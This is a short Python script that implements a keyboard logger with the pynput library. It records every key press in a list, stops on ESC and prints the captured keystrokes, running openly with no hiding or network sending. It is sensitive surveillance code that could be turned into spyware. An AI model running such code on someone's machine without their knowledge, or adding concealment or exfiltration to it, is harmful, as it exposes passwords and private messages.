import pynput
from pynput import keyboard
class KeyLogger:
    def __init__(self):
        self.log = []

    def on_press(self, key):
        try:
            self.log.append(f'Key {key.char} pressed')
        except AttributeError:
            self.log.append(f'Special key {key} pressed')

    def on_release(self, key):
        if key == keyboard.Key.esc:
            return False  # Stop listener

    def start(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join() 

if __name__ == "__main__":
    keylogger = KeyLogger()
    print("Keylogger started. Press ESC to stop.")
    keylogger.start()
    print("Keylogger stopped. Log:")
    for entry in keylogger.log:
        print(entry)
